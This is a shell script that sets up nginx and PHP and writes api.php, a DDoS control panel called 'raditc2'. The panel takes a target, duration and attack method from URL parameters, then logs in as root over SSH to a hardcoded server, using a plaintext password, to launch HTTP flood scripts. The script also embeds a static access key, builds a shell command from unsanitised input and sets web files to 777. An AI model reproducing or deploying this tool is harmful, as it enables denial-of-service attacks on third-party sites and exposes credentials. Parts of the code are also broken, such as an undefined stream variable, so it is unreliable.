#!/bin/sh

# Welcome to the Auto Setup Script
echo "Welcome to the Auto Setup Script"

# Update the system packages
echo "Updating system packages..."
apt update && apt upgrade -y

# Install software
echo "Installing software..."
apt install -y nginx php-ssh2
sudo apt-get -y install gcc make autoconf libc-dev pkg-config
sudo apt-get -y install libssh2-1-dev npm git

# Install php8.1-fpm
echo "Installing php8.1-fpm..."
sudo apt-get install php8.1-fpm -y

# Install unzip
echo "Installing unzip..."
apt install -y unzip

# Change to the /var/www/html directory
cd /var/www/html

# Create api.php file with the provided content
echo "<?php

ignore_user_abort(true);

set_time_limit(1000);

require 'vendor/autoload.php';

use phpseclib3\Net\SSH2;

echo \"<h1>raditc2 API System</h1>\";

function connectToSSH(\$host, \$port, \$username, \$password) {
    if(!(\$ssh = new SSH2(\$host, \$port))){
        echo \"Gagal connect ke server SSH: \$host\\n\";
    }else{
        if (!\$ssh->login(\$username, \$password)) {
            echo \"Gagal login ke server SSH: \$host\\n\";
            return false;
        } else {
            return \$ssh;
        }
    }
}

\$servers = [
    [
        'host' => '143.42.2.21',
        'port' => 22,
        'username' => 'root',
        'password' => 'Kurukuu1MD_'
    ],
];

\$methods = array(\"tls-bypass\",\"https\",\"raw\",\"stop\");
\$keys = array(\"radityahh\");
\$key = \$_GET['key'];
\$website = \$_GET['host'];
\$time = intval(\$_GET['time']);
\$method = \$_GET['method'];
\$action = \$_GET['action'];

if (empty(\$key) ||empty(\$time) || empty(\$website) || empty(\$method)) {
    die('Error: Some parameters are empty!');
}

if(!in_array(\$key, \$keys)){
    die('Error: Keys not available');
}

if (!in_array(\$method, \$methods)) {
    die('Error: The method you requested does not exist!');
}

if (!is_numeric(\$time)) {
    die('Error: Time is not in numeric form!');
}

if (\$time > 1000) {
    die('Error: Cannot exceed 1000 seconds!');
}

switch(\$method){
    case \"raw\":
        \$command = \"node HTTP-RAW.js \$website \$time\";
        break;
    case \"stop\":
        \$command = \"pkill \$host -f\";
        break;
}

// Loop melalui daftar server dan hubungkan
foreach (\$servers as \$server) {
    \$host = \$server['host'];
    \$port = \$server['port'];
    \$username = \$server['username'];
    \$password = \$server['password'];

    \$ssh = connectToSSH(\$host, \$port, \$username, \$password);

    if (\$ssh) {
        \$output = \$ssh->exec(\$command);
        stream_set_blocking(\$output, false);
        \$data = '';
        while (\$buf = fread(\$stream, 4096)) {
            \$data .= \$buf;
        }
        echo \"server \$host start attack\";
        \$ssh->disconnect();
    } else {
        echo \"ssh error niigasssss\";
    }
}
?>" > api.php

# Change to the /etc/nginx/sites-available directory
cd /etc/nginx/sites-available

# Remove the old 'default' file if it exists
if [ -f default ]; then
  echo "Removing the old 'default' file..."
  rm default
fi

# Create a new 'default' file
echo "Creating a new 'default' file..."
cat <<EOL > default
##
# Default server configuration
#
server {
 listen 80 default_server;
 listen [::]:80 default_server;

 root /var/www/html;

 index index.php index.html index.htm index.nginx-debian.html;

 server_name _;

 location / {
  try_files \$uri \$uri/ =404;
 }

 location ~ \.php$ {
  include snippets/fastcgi-php.conf;
  fastcgi_pass unix:/run/php/php8.1-fpm.sock;
 }

 location ~ /\.ht {
  deny all;
 }
}
EOL

# Return to the /var/www/html directory
cd /var/www/html

# Restart Nginx
echo "Restarting Nginx..."
systemctl restart nginx

# Set directory permissions to 777 (BE CAREFUL WITH THIS!)
echo "Setting directory permissions to 777 (BE CAREFUL!)"
sudo chmod -R 777 /var/www/html

# Done
echo "Setup completed. Thank you!"
